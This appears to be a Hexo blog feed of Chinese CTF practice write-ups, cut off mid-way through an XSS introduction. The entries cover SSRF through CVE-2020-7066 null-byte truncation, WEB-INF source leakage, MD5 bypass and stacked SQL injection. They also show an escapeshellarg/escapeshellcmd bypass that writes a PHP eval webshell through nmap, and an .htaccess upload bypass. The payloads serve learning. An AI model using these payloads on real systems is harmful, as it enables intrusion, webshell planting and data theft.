</p><p>附上讲解和githack下载教程：<br><a href="https://blog.csdn.net/qq_43504837/article/details/107797049?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161547871616780266269976%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161547871616780266269976&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-107797049.first_rank_v2_pc_rank_v29&utm_term=githack%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85linux">GitHack 下载</a><br><a href="https://blog.csdn.net/mochu7777777/article/details/110872903?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_utm_term-0&spm=1001.2101.3001.4242">GXYCTF2019禁止套娃</a></p>]]></content>
      
      
      <categories>
          
          <category> test46 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习4</title>
      <link href="test45/undefined-undefined.html"/>
      <url>test45/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这道题应该是我第一次接触到漏洞题，也就是cve题目，其实cve题目也就是一个漏洞，让你找到这个漏洞在哪并且利用它来得到flag，每一个漏洞都有自己的编号，比如cve-…..-……。这种题还是考验对漏洞的发现能力和利用能力。这道题还是比较简单的。  </p><h1 id="GKCTF2020-cve版签到-1"><a href="#GKCTF2020-cve版签到-1" class="headerlink" title="[GKCTF2020]cve版签到 1"></a>[GKCTF2020]cve版签到 1</h1><p>这道题直接就给出提示了<br>cve-2020-7066<br>那就立刻搜下这个漏洞是什么。<br><a href="https://img.imgdb.cn/item/6049e1375aedab222cfb73f6.png"><img src="https://img.imgdb.cn/item/6049e1375aedab222cfb73f6.png"></a><br>翻译过来就是在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，同时将get _ headers（）与用户提供的URL一起使用时，如果URL包含零（\ 0）字符，则URL将被静默地截断。这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。  </p><p>正如官方演示的一样。  </p><pre><code>&lt;?php// user input$_GET[&#39;url&#39;] = &quot;http://localhost\0.example.com&quot;;$host = parse_url($_GET[&#39;url&#39;], PHP_URL_HOST);if (substr($host, -12) !== &#39;.example.com&#39;) &#123;die();&#125;$headers = get_headers($_GET[&#39;url&#39;]);var_dump($headers);  </code></pre><p>按理说应该是报错的，因为url的格式出错，但是因为\0的作用，使后面的字符串都被截断了，所以最后传上去的其实是<a href="http://localhost,后面的的都是无效的./">http://localhost，后面的的都是无效的。</a>  </p><p>那么了解了这个漏洞之后，我们可以想到这个漏洞可以用来进行ssrf攻击。<br><a href="https://img.imgdb.cn/item/6049e4895aedab222cfdae54.png"><img src="https://img.imgdb.cn/item/6049e4895aedab222cfdae54.png"></a><br>从开始的页面中可以看到他让我们只能访问*.ctfhub.com ，很明显是对url传参做出了限制，这也是ssrf的一个标志。  </p><p>然后通过抓包可以看到头文件信息中给了提示，说是让我们连接本地网站。<br><a href="https://img.imgdb.cn/item/6049e5645aedab222cfe352b.png"><img src="https://img.imgdb.cn/item/6049e5645aedab222cfe352b.png"></a><br>那么我们就可以这样构造payload来绕过对url的限制。  </p><blockquote><p>?url=<a href="http://127.0.0.1%00.ctfhub.com">http://127.0.0.1%00.ctfhub.com</a>  </p></blockquote><p>通过%00截断，利用了这个漏洞，我们实际上传的url是?url=<a href="http://127.0.0.1这样既满足了它对url结尾的限制,又连接上了内网./">http://127.0.0.1这样既满足了它对url结尾的限制，又连接上了内网。</a>  </p><p><a href="https://img.imgdb.cn/item/6049e6275aedab222cfeccf9.png"><img src="https://img.imgdb.cn/item/6049e6275aedab222cfeccf9.png"></a>  </p><p>接着它又要求我们的url必须以123结尾，那么再在结尾处添加上就可以了。  </p><blockquote><p>?url=<a href="http://127.0.0.123%00.ctfhub.com">http://127.0.0.123%00.ctfhub.com</a></p></blockquote><p>这样就得到flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目是一个新的题型，其实就是关于漏洞的利用和漏洞的发掘，主要考的还是自己的理解，比如这道题通过get _ headers（）函数与url一起使用时的漏洞想到用ssrf攻击，从而得到flag。这种题对于知识面的考验还是很大的。  </p><p><a href="https://bugs.php.net/bug.php?id=79329">cve-2020-7066</a></p>]]></content>
      
      
      <categories>
          
          <category> test45 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习3——文件泄露</title>
      <link href="test44/undefined-undefined.html"/>
      <url>test44/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>最近两天课有点多，没有时间来整理写过的题，所以这次一下补上。</p><h1 id="RoarCTF-2019-Easy-Java-1"><a href="#RoarCTF-2019-Easy-Java-1" class="headerlink" title="[RoarCTF 2019]Easy Java 1"></a>[RoarCTF 2019]Easy Java 1</h1><p>这道题目又是源码泄露，其实关于源码泄露的题目做过不少了，也遇到了不同源码泄露的题目，有时间可以总结一下。  </p><p>先看这道题吧，打开题目发现是一个登录界面，很自然就想到了sql注入。<br><a href="https://img.imgdb.cn/item/6049d08a5aedab222cf2028e.png"><img src="https://img.imgdb.cn/item/6049d08a5aedab222cf2028e.png"></a><br>但是无论怎么注入都是错误的，只能看一下下面的提示了。<br><a href="https://img.imgdb.cn/item/6049d0c95aedab222cf225b7.png"><img src="https://img.imgdb.cn/item/6049d0c95aedab222cf225b7.png"></a><br>好家伙，提示也是一行报错，但是看到报错中有java字样，所以这道题应该和java有关。  </p><p>接下来抓包试一下，这里有一个有点坑的地方，就是要以post请求才能显示正常的help页面。。。这个地方其实还是不容易想到的，这次算是长见识了吧。  </p><p>那么就抓包并且把请求方式改成post试一下。<br><a href="https://img.imgdb.cn/item/6049d2965aedab222cf34c78.png"><img src="https://img.imgdb.cn/item/6049d2965aedab222cf34c78.png"></a><br>果然有东西，可以看到有这样一串字符</p><blockquote><p>com.wm.ctf.DownloadController.doPost(DownloadController.java:24)  </p></blockquote><p>说明确实和java有关，实际上这道题确实就是有关java的网站源码的泄露。  </p><p><a href="https://img.imgdb.cn/item/6049d3915aedab222cf3e8fb.jpg"><img src="https://img.imgdb.cn/item/6049d3915aedab222cf3e8fb.jpg"></a>  </p><p>而WEB-INF文件就可以造成文件泄露，这里简单讲一下关于WEB-INF/web.xml泄露。  </p><h2 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p><pre><code>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件</code></pre><p>漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。  </p><p>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p><p>所以这里我们可以先读取通过WEB-INF读取web.xml文件，查看有哪些servl和其下的class文件，然后再读取有关网站源码的class文件，通过反编译得到网站源码。  </p><p>我们先读取web.xml文件。<br><a href="https://img.imgdb.cn/item/6049d5f95aedab222cf5570b.png"><img src="https://img.imgdb.cn/item/6049d5f95aedab222cf5570b.png"></a>  </p><p>可以看到class文件中有一个com.wm.ctf.FlagControlle文件，很明显这个就是我们要找的文件了。接下来直接使用/WEB-INF/classes/读取就行了。（文件路径就是com/wm/ctf/FlagController.class）  </p><p>可以看到文件中有一串base64编码。把它解码一下就是flag。  </p><p><a href="https://img.imgdb.cn/item/6049d7505aedab222cf5f3ce.png"><img src="https://img.imgdb.cn/item/6049d7505aedab222cf5f3ce.png"></a><br><a href="https://img.imgdb.cn/item/6049d7b15aedab222cf6338c.png"><img src="https://img.imgdb.cn/item/6049d7b15aedab222cf6338c.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考的主要还是源码泄露，只不过是有关java的网页的WEB-INF/web.xml泄露，之前还遇到过.git的源码泄露以及文件备份泄露，这些不同类型的源码泄露的掌握还是很有必要的，否则题目一开始就卡壳了。   </p><p><a href="https://blog.csdn.net/wy_97/article/details/78165051">ctf/web源码泄露及利用办法【总结中】</a></p>]]></content>
      
      
      <categories>
          
          <category> test44 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习2——关于escapeshellarg()+escapeshellcmd()的函数漏洞</title>
      <link href="test43/undefined-undefined.html"/>
      <url>test43/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>一共两道题，先记录一道简单的。  </p><h1 id="MRCTF2020-Ez-bypass-1"><a href="#MRCTF2020-Ez-bypass-1" class="headerlink" title="[MRCTF2020]Ez_bypass 1"></a>[MRCTF2020]Ez_bypass 1</h1><p>打开题目，很明显是一道md5绕过题目，很简单。<br><a href="https://img.imgdb.cn/item/604598c8cef1ec5e6f3a06ce.png"><img src="https://img.imgdb.cn/item/604598c8cef1ec5e6f3a06ce.png"></a><br>第一个是md5绕过可以直接使用数组来绕过，原理是当数组经过md5加密后不会报错而是返回false，而false===false是成立的，，但是这两个数组却不相等，所以成功绕过。  </p><p>数组如下：</p><blockquote><p>a[]=1&amp;b[]=2</p></blockquote><p>第二个绕过利用了字符串在==比较下的一个特点，当有这样一组字符串时：1234567abc，如果它和1234567进行双等号（==）的比较时，会自动截取字符串的第一组数字部分进行比较，也就是截取1234567来进行比较，所以就可以用来满足不是数字却可以等于1234567的绕过。  </p><p>所以我们构建如下字符串即可：  </p><blockquote><p>passwd=1234567abc</p></blockquote><p>总的来说这道题还是比较简单的。关于md5绕过的类型网上一搜就有。  </p><h1 id="BUUCTF-2018-Online-Tool-1"><a href="#BUUCTF-2018-Online-Tool-1" class="headerlink" title="[BUUCTF 2018]Online Tool 1"></a>[BUUCTF 2018]Online Tool 1</h1><p>这道题就没那么简单了。<br>打开题目，看到源码。<br><a href="https://img.imgdb.cn/item/60464a835aedab222c208876.png"><img src="https://img.imgdb.cn/item/60464a835aedab222c208876.png"></a><br>题目上也给过提示了，说这是一道rec题，也就时命令执行语句的题目。  </p><p>那我们就先审计一下代码吧。  </p><pre><code>if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;$_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];&#125;  </code></pre><p>这串代码是关于服务器获取ip用的，对于这道题目没有什么关系，重点是下面的代码。  </p><pre><code>if(!isset($_GET[&#39;host&#39;])) &#123;highlight_file(__FILE__);&#125; else &#123;$host = $_GET[&#39;host&#39;];$host = escapeshellarg($host);$host = escapeshellcmd($host);$sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);echo &#39;you are in sandbox &#39;.$sandbox;@mkdir($sandbox);chdir($sandbox);echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125;  </code></pre><p>这串代码就是执行rec的关键了，其中变量host以get方式来进行传参。也就是说我们要用host来上传我们的rec语句。  </p><p>可以注意到，这道题和之前的rec有些不同，有两个从没见过的函数：escapeshellarg()和escapeshellcmd()。  </p><p>没见过就查一下。  </p><pre><code>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)   escapeshellcmd — shell 元字符转义功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。反斜线（\）会在以下字符之前插入：&amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *&#39; 和 &quot; 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</code></pre><p>这两个函数其实是官方用来防止rec的，但是没想到利用它们却可以来进行更大范围的攻击。。。。。  </p><p>有一篇博客专门介绍了这个漏洞，下面稍后附上连接。我就先简单讲一下这个漏洞的形成。  </p><p>当我们传入的参数是172.17.0.2’ -v -d a=1时，经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，因为escapeshellarg()会将所有的单引号都给转义了，然后还会给字符串增加单引号——这是因为当我们的一般rec语句传入后，如果被加上了单引号，因为在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。这也从而避免了rec攻击。  </p><p>所以经过escapeshellarg()后语句变成了     </p><pre><code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;，</code></pre><p>函数分别给172.17.0.2和-v -d a=1都加上了单引号，并且把原来的单引号转义。  </p><p>接下来再经过escapeshellcmd处理后变成  </p><pre><code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，  </code></pre><p>这是因为  </p><pre><code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code></pre><p>中有一个没配对的单引号(是a=1后面那个单引号)和\，所以escapeshellcmd()函数对这个单引号和\又进行了一次转义。  </p><p>那么问题来了，经过转义的\就不再是转义符了所以\后面的’没被转义，所以最后的语句是这样的’172.17.0.2’\‘’ -v -d a=1&#39;，可以看到没被转义的单引号和后面的单引号闭合成了一个空白连接符，所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。这也就绕过了这两个函数对于rec的限制。  </p><p>知道原理后如何构造语句呢？可以看到最后的代码是  </p><blockquote><p>echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p></blockquote><p>也就是说我们要用nmap命令来执行rec，网上搜一下什么命令可以利用，发现可以用nmap命令-oG将一个命令写入到自己指定的文件中，那么接下来就是写一句话木马来上传了。  </p><p>看一眼别人怎么写的，不由得佩服。  </p><blockquote><p>?host=’ <?php eval($_POST["v"]);?> -oG shell.php ‘</p></blockquote><p>关于这个payload不得不说很巧妙，首先经过escapeshellarg()后：  </p><pre><code>&#39;&#39;\&#39;&#39; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#39;\&#39;&#39;&#39;  </code></pre><p>成了这样，再经过escapeshellcmd()后成了  </p><pre><code>&#39;&#39;\\&#39;&#39; \&lt;\?php eval\($_POST\[&quot;v&quot;\]\)\;\?\&gt; -oG shell.php &#39;\\&#39;&#39;&#39;  </code></pre><p>化简一下就成了  </p><pre><code> \ \&lt;\?php eval\($_POST\[&quot;v&quot;\]\)\;\?\&gt; -oG shell.php \\(因为&#39;\\&#39;最后就是\\而不发挥转义作用) </code></pre><p>也就成功将一句话木马写入shell.php文件中了，同时给出了文件名，我们也就可以用剑蚁连接得到flag。  </p><p><a href="https://img.imgdb.cn/item/60465f5e5aedab222c299c04.png"><img src="https://img.imgdb.cn/item/60465f5e5aedab222c299c04.png"></a></p><p>关于这个payload还有一些细节。  </p><h3 id="一、单引号后面有空格"><a href="#一、单引号后面有空格" class="headerlink" title="一、单引号后面有空格"></a>一、单引号后面有空格</h3><p>如果没有空格两个函数执行后就成了’<?php eval($_POST["v"]);?> -oG shell.php’上面说过当单引号里有变量时变量是被解析成字符的，从而无法成功执行rec。  </p><h3 id="二、引号旁边加空格"><a href="#二、引号旁边加空格" class="headerlink" title="二、引号旁边加空格"></a>二、引号旁边加空格</h3><p>如果不加，当两个函数执行并echo出来后就会变成：</p><pre><code>\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\</code></pre><p>这样文件就变成了shell.php\ \   </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>第二道rec题目明显更难理解一些，只有把关于escapeshellarg()和escapeshellcmd()具体的功能理解透才能绕过rec的限制来执行我们的语句，这次也积累了一种新的rec类型，关于rec的类型还有很多，还是要不断积累和思考才行啊。<br>同时关于namp的命令的了解还是较少，以后要逐渐了解这个。  </p><p>附上漏洞学习博客</p><p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>]]></content>
      
      
      <categories>
          
          <category> test43 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记两道新人赛题目</title>
      <link href="test42/undefined-undefined.html"/>
      <url>test42/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>寒假参加了一下中南大学的ctf新人赛，题目大多数挺简单的，但是其中有两道题被坑的很惨。看了wp后才知道是这么做的，现在记录一下。   </p><h1 id="一、easySSRF"><a href="#一、easySSRF" class="headerlink" title="一、easySSRF"></a>一、easySSRF</h1><p>这道题题目考的是ssrf，但是并不是很难，题目源码如下。可以看到，下面提示flag在一个内网ip中，并且可以通过url进行get传参。所以我们可以使用ssrf漏洞来连接这个内网ip。  </p><p>构造?url=<a href="http://192.168.54.3/%E4%BE%BF%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E4%B8%8B%E4%B8%80%E9%98%B6%E6%AE%B5%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82">http://192.168.54.3/便可以看到下一阶段的代码。</a>  </p><p><a href="https://img.imgdb.cn/item/60408940360785be5445b39f.png"><img src="https://img.imgdb.cn/item/60408940360785be5445b39f.png"></a><br>这里第一个小坑是$A($B)这行代码的理解，当时就是在这个地方卡了很长时间，后来看了官方wp后发现这行代码就是来让我们构造变量A,B来执行任意代码的。  </p><p>比如构造a=system&amp;b=cat /flag.txt这样的。那么代入这行代码就是system(cat /flag.txt)就执行了命令执行函数。  </p><p>而我当时却把它当成了什么特别的语法，以为$A($B)是什么逻辑运算，而忽略了最直接的变量拼接。。。。。。  </p><p>然后还有一个坑，就是构造的url还要再进行一次url编码否则在curl api中会显示错误。  </p><p>这里的变量b构造时应该是b=cat+/flag.txt而不能使用空格。原因是当url中有空格时，get和post会请求失败，所以我们使用加号来代替空格，加号在url编码中可以被视为空格。<br><a href="https://img.imgdb.cn/item/60408eb5360785be54488c13.png"><img src="https://img.imgdb.cn/item/60408eb5360785be54488c13.png"></a><br>这样将编码过的url再次执行就可以了。  </p><h1 id="二、linkgame"><a href="#二、linkgame" class="headerlink" title="二、linkgame"></a>二、linkgame</h1><p>第二道题目是一个连连看游戏，在玩了一会后发现没有任何提示，于是尝试f12大法，却发现f12被禁掉了。到这里就没再往下想过，谁知道看了wp后发现flag就在源码里，只不过用别的方法就可以查看代码。。。。  </p><h2 id="view-source协议"><a href="#view-source协议" class="headerlink" title="view-source协议"></a>view-source协议</h2><pre><code>view-source是一种协议，早期基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于WindowsXP pack2以及更高版本以后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器都还可以使用。 如果要在IE下查看源代码,只能使用查看中的&quot;查看源代码&quot;命令.以前的使用方法：在浏览器地址栏中输入view-source: sURL回车即可看到当前网页的源代码了。JS用法:window.location=&quot;view-source:&quot; + window.location浏览器直接查看源码  </code></pre><p>又知道了一个新的快捷方法。<br><a href="https://img.imgdb.cn/item/60409060360785be544988df.png"><img src="https://img.imgdb.cn/item/60409060360785be544988df.png"></a>   </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这两道题其实都很简单，主要还是当时想的太多，把题目往难得地方想去了，导致自己给自己增添了不少难度。有时候凭直觉也是很重要的。  </p><p><a href="https://blog.csdn.net/yuwq123/article/details/79481829">view-source协议查看源码</a></p>]]></content>
      
      
      <categories>
          
          <category> test42 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习1</title>
      <link href="test41/undefined-undefined.html"/>
      <url>test41/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>新学期开始，开始日常的练习。依旧是从buuctf下手。  </p><h1 id="GYCTF2020-Blacklist-1"><a href="#GYCTF2020-Blacklist-1" class="headerlink" title="[GYCTF2020]Blacklist 1"></a>[GYCTF2020]Blacklist 1</h1><p>这道题考的和最开始的强网杯随便注那道题一摸一样，应该是模仿那一道题目出的题。<br>直接看题，明显是一个sql注入，而且也给我们说了有黑名单的存在，所以说有一些过滤。  </p><p>发现输入1和2的时候都会有回显，而输入别的却没有回显。<br><a href="https://img.imgdb.cn/item/603f4357360785be54bbc4bd.png"><img src="https://img.imgdb.cn/item/603f4357360785be54bbc4bd.png"></a><br><a href="https://img.imgdb.cn/item/603f43fc360785be54bc12e4.png"><img src="https://img.imgdb.cn/item/603f43fc360785be54bc12e4.png"></a>  </p><p>接着我们判断是什么闭合方式。<br>当输入1’时发生报错，输入1’#后正常回显，说明是单引号闭合，然后输入1’ and ‘1’=’1时正常，而输入1’ and ‘1’=’2时无回显，说明是字符型注入。  </p><p>接着判断有几列，当输入1’ order by 3#时报错，说明只有两列。  </p><p>接下来就是看有无回显位，输入1’ union select 1,2#后发现有过滤。<br><a href="https://img.imgdb.cn/item/603f4572360785be54bcbd4b.png"><img src="https://img.imgdb.cn/item/603f4572360785be54bcbd4b.png"></a><br>可以看到过滤了select，那么就用show来显示数据，关于show的用法和介绍在之前的博客讲过。因为select被过滤，所以这里我们需要使用堆叠注入来代替联合注入。  </p><p>接着步骤和之前做的那道题一样。<br>查库名。  </p><blockquote><p>1’; show databases;#  </p></blockquote><p>查表名。  </p><blockquote><p>1’;show tables from supersqli;#</p></blockquote><p>查字段。  </p><blockquote><p>1’;show columns from words;#<br>1’;show columns from FlagHere;#</p></blockquote><p>读出字段信息。  </p><blockquote><p>1’;handler FlagHere open;handler FlagHere read first;–+</p></blockquote><p>得到flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题就是随便注的复刻，只是改了一下字段名字而已，在掌握堆叠注入和绕过select查询信息的方法后并不算难，权当复习吧。</p>]]></content>
      
      
      <categories>
          
          <category> test41 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习29</title>
      <link href="test40/undefined-undefined.html"/>
      <url>test40/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> test40 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习28——上传绕过</title>
      <link href="test39/undefined-undefined.html"/>
      <url>test39/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天又是上传问题。最近发现上传问题已经绕过最刚开始的上传限制的考点了，而是考查更加深入了，上次我们遇到了通过修改.user.ini配置文件来使我们上传的图片也能被解析成一句话木马来执行，从而绕过了网页对文件后缀名的过滤（这个方法是在我们发现phtml，php5等后缀名已经无法绕过时可以使用的）。  </p><p>今天这道题目原理和思路和上面说的一样。  </p><h1 id="MRCTF2020-你传你马呢-1"><a href="#MRCTF2020-你传你马呢-1" class="headerlink" title="[MRCTF2020]你传你马呢 1"></a>[MRCTF2020]你传你马呢 1</h1><p>题目很粗俗啊。打开题目发现就是一个上传界面。<br><img src="https://i.loli.net/2021/02/25/nrZ4ek25bxvAypO.png" alt="7.png"><br>那我们就按照一般思路来上传文件，直接上传一句话木马然后抓包。<br><img src="https://i.loli.net/2021/02/25/yd9sewrBMZiY4nh.png" alt="88.png"><br>果然直接上传是不行的，那么就改一下文件类型，改成图片模式吧。<br><img src="https://i.loli.net/2021/02/25/q6rJasDgNkEjWmZ.png" alt="8.png"><br>果然直接就成功了，接下来就是把文件后缀名改成php文件，这样才能执行我们的一句话代码。<br><img src="https://i.loli.net/2021/02/25/gYlXChMwAfND1Et.png" alt="9.png"><br>果不其然，不行，在尝试了别的php后缀名绕过方式后都被拦截了。那我们就很容易联想到上次的修改.user.ini配置文件来是我们上传的jpg文件可以被解析成php文件来执行。  </p><p>同样的，并不是只有这一个配置文件，还有一个.htaccess文件。它同样修改php配置。  </p><h2 id="htaccess文件简介："><a href="#htaccess文件简介：" class="headerlink" title=".htaccess文件简介："></a>.htaccess文件简介：</h2><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。  </p><p>而如果想要将其他类型的文件均已php格式解析的话有以下姿势。  </p><h3 id="htaccess文件上传"><a href="#htaccess文件上传" class="headerlink" title=".htaccess文件上传"></a>.htaccess文件上传</h3><p>方法一：  </p><pre><code>FileMatch 参数即为文件名的正则匹配&lt;FilesMatch &quot;1.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;// 1.jpg&lt;?php eval($_GET[&#39;a&#39;]);?&gt;</code></pre><p>方法二：  </p><pre><code>AddType application/x-httpd-php .jpg// 1.jpg&lt;?php eval($_GET[&#39;a&#39;]);?&gt;  </code></pre><p>这里我们采用方法二就行了，打开.htaccess文件并且写入AddType application/x-httpd-php shell.jpg在上传就行了。注意要把type改成image/jpeg类型。<br><img src="https://i.loli.net/2021/02/25/3qM5SCWOIk4NuhJ.png" alt="10.png">  </p><p>可以看到，.htaccess文件已经成功上传了，接下来再上传我们的图片后缀的一句话代码就可以用剑蚁连接了。上传路径是upload/bba643cb99ca81e160bd4430543786f9/shell.jpg<br>在根目录下就可以找到flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题和之前那道题目很类似，都使在无法绕过后缀名的限制的情况下通过修改配置文件来使我们上传的jpg文件也能被解析成php文件从而执行一句话木马。原理差不多相同。关于上传问题还是有很多类型的，需要多多积累。<br><a href="https://blog.csdn.net/since_2020/article/details/113781120?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161418501016780262570602%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161418501016780262570602&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-113781120.first_rank_v2_pc_rank_v29&utm_term=.htaccess%E6%96%87%E4%BB%B6">.htaccess文件</a></p>]]></content>
      
      
      <categories>
          
          <category> test39 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习27——xxs攻击</title>
      <link href="test38/undefined-undefined.html"/>
      <url>test38/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天简单认识一下新的攻击方式——xxs攻击。<br>知道这个攻击还是在一个招新题上知道的，简单了解了一下，现在做一下笔记，附上题目wp。  </p><h1 id="一、什么是XSS，XSS如何发生的？"><a href="#一、什么是XSS，XSS如何发生的？" class="headerlink" title="一、什么是XSS，XSS如何发生的？"></a>一、什么是XSS，XSS如何发生的？</h1><p>我们知道，web页面是由js代码写成的，但是如果网页对用户输入提交给web server的内容不做出严格限制和过滤，那么就可以向web页面里插入如恶意js代码，当用户浏览该页之时，嵌入其中Web里面的JS代码会被执行，从而达到恶意的特殊目的。<br>攻击者通过xss攻击，可以获取到用户的cookie，然后发送给攻击者想要攻击的网站，因为跨站了，所以也称为跨站脚本攻击。  </p><h1 id="二、XSS分类"><a href="#二、XSS分类" class="headerlink" title="二、XSS分类"></a>二、XSS分类</h1><p>xss攻击有三类，分别是反射型，存储型，DOM型。  </p><h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><p>非存储型，就是通过get或者post请求时，被后端处理过数据，并且响应到前端页面上。  </p><h3 id="反射型xss的攻击步骤："><a href="#反射型xss的攻击步骤：" class="headerlink" title="反射型xss的攻击步骤："></a>反射型xss的攻击步骤：</h3><p>1、攻击者构造出特殊的URL，其中包含恶意代码；</p><p>2、用户打开带有恶意代码的URL时，网站服务端将恶意代码从URL中取出，拼接在HTML中返回给浏览器；</p><p>3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；</p><p>4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h3><p>1、攻击脚本非持久性，没有保存在web 